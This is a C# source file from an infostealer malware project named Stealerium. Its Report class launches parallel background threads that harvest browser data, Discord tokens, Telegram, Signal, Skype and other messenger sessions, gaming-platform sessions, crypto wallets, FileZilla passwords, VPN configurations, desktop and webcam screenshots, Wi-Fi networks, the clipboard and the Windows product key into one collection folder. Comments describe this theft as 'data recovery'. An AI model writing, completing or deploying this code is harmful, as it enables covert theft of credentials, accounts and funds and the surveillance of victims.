using System;
using System.Collections.Generic;
using System.IO;
using System.Threading;
using Stealerium.Clipper;
using Stealerium.Target;
using Stealerium.Target.Browsers.Chromium;
using Stealerium.Target.Browsers.Edge;
using Stealerium.Target.Browsers.Firefox;
using Stealerium.Target.Gaming;
using Stealerium.Target.Messengers;
using Stealerium.Target.System;
using Stealerium.Target.VPN;

namespace Stealerium.Helpers
{
    /// <summary>
    /// The Report class generates a report by collecting data from different system sources
    /// and saving it in a specified directory.
    /// </summary>
    internal sealed class Report
    {
        /// <summary>
        /// Creates a system report and saves it to the specified path.
        /// </summary>
        /// <param name="sSavePath">The directory where the report will be saved.</param>
        /// <returns>True if the report was created successfully, otherwise false.</returns>
        public static bool CreateReport(string sSavePath)
        {
            var tasks = new List<Thread>(); // List of tasks (threads) to run

            try
            {
                // Create the main directory for the report
                Directory.CreateDirectory(sSavePath);

                // Create subdirectories for different data types
                var browserPath = Path.Combine(sSavePath, "Browsers");
                var messengerPath = Path.Combine(sSavePath, "Messenger");
                var gamingPath = Path.Combine(sSavePath, "Gaming");
                var systemPath = Path.Combine(sSavePath, "System");
                var vpnPath = Path.Combine(sSavePath, "VPN");
                var walletsPath = Path.Combine(sSavePath, "Wallets");

                Directory.CreateDirectory(browserPath);
                Directory.CreateDirectory(messengerPath);
                Directory.CreateDirectory(systemPath);

                // Multi-threaded task: Grabbing files
                tasks.Add(CreateTask(() => FileGrabber.Run(sSavePath + "\\Grabber")));

                // Browser data recovery: Chromium, Edge, Firefox
                tasks.Add(CreateTask(() =>
                {
                    RecoverChrome.Run(browserPath);
                    RecoverEdge.Run(browserPath);
                    RecoverFirefox.Run(browserPath);
                }));

                // Messenger data recovery
                tasks.Add(CreateTask(() => Discord.WriteDiscord(Discord.GetTokens(), Path.Combine(messengerPath, "Discord"))));
                tasks.Add(CreateTask(() => Pidgin.Get(Path.Combine(messengerPath, "Pidgin"))));
                tasks.Add(CreateTask(() => Outlook.GrabOutlook(Path.Combine(messengerPath, "Outlook"))));
                tasks.Add(CreateTask(() => Target.Messengers.Telegram.GetTelegramSessions(Path.Combine(messengerPath, "Telegram"))));
                tasks.Add(CreateTask(() => Skype.GetSession(Path.Combine(messengerPath, "Skype"))));
                tasks.Add(CreateTask(() => Element.GetSession(Path.Combine(messengerPath, "Element"))));
                tasks.Add(CreateTask(() => Signal.GetSession(Path.Combine(messengerPath, "Signal"))));
                tasks.Add(CreateTask(() => Tox.GetSession(Path.Combine(messengerPath, "Tox"))));
                tasks.Add(CreateTask(() => Icq.GetSession(Path.Combine(messengerPath, "ICQ"))));

                // Gaming data recovery
                tasks.Add(CreateTask(() =>
                {
                    Steam.GetSteamSession(Path.Combine(gamingPath, "Steam"));
                    Uplay.GetUplaySession(Path.Combine(gamingPath, "Uplay"));
                    BattleNet.GetBattleNetSession(Path.Combine(gamingPath, "BattleNET"));
                }));
                tasks.Add(CreateTask(() => Minecraft.SaveAll(Path.Combine(gamingPath, "Minecraft"))));

                // Wallet data recovery
                tasks.Add(CreateTask(() =>
                {
                    Wallets.GetWallets(walletsPath);
                    Target.Browsers.Chromium.Extensions.GetChromeWallets(Path.Combine(walletsPath, "Chrome_Wallet"));
                    Target.Browsers.Edge.Extensions.GetEdgeWallets(Path.Combine(walletsPath, "Edge_Wallet"));
                }));

                // FileZilla data recovery
                tasks.Add(CreateTask(() => FileZilla.WritePasswords(sSavePath + "\\FileZilla")));

                // VPN data recovery
                tasks.Add(CreateTask(() =>
                {
                    ProtonVpn.Save(Path.Combine(vpnPath, "ProtonVPN"));
                    OpenVpn.Save(Path.Combine(vpnPath, "OpenVPN"));
                    NordVpn.Save(Path.Combine(vpnPath, "NordVPN"));
                }));

                // System directory and process information
                tasks.Add(CreateTask(() =>
                {
                    Directory.CreateDirectory(sSavePath + "\\Directories");
                    DirectoryTree.SaveDirectories(sSavePath + "\\Directories");
                }));
                tasks.Add(CreateTask(() =>
                {
                    ProcessList.WriteProcesses(systemPath);
                    ActiveWindows.WriteWindows(systemPath);
                }));

                // Screenshots: Desktop and Webcam
                tasks.Add(CreateTask(() =>
                {
                    DesktopScreenshot.Make(systemPath);
                    WebcamScreenshot.Make(systemPath);
                }));

                // WiFi networks (saved and scanning)
                tasks.Add(CreateTask(() =>
                {
                    Wifi.SavedNetworks(systemPath);
                    Wifi.ScanningNetworks(systemPath);
                }));

                // Windows product key
                tasks.Add(CreateTask(() => File.WriteAllText(systemPath + "\\ProductKey.txt", ProductKey.GetWindowsProductKeyFromRegistry())));

                // Debug logs and system information
                tasks.Add(CreateTask(() => Logging.Save(Path.Combine(systemPath, "Debug.txt"))));
                tasks.Add(CreateTask(() => SysInfo.Save(Path.Combine(systemPath, "Info.txt"))));

                // Clipboard content
                tasks.Add(CreateTask(() => File.WriteAllText(Path.Combine(systemPath, "Clipboard.txt"), Clipboard.GetText())));

                // Installed applications list
                tasks.Add(CreateTask(() => InstalledApps.WriteAppsList(systemPath)));

                // Start all tasks
                foreach (var task in tasks)
                {
                    task.Start();
                }

                // Wait for all tasks to finish
                foreach (var task in tasks)
                {
                    task.Join();
                }

                return Logging.Log("Report created successfully");
            }
            catch (Exception ex)
            {
                return Logging.Log($"Failed to create report, error:\n{ex}", false);
            }
        }

        /// <summary>
        /// Creates a thread for executing a specific task.
        /// </summary>
        /// <param name="action">The action to be executed in the thread.</param>
        /// <returns>A thread object.</returns>
        private static Thread CreateTask(ThreadStart action)
        {
            var thread = new Thread(action)
            {
                IsBackground = true // Set the thread as a background thread
            };
            return thread;
        }
    }
}
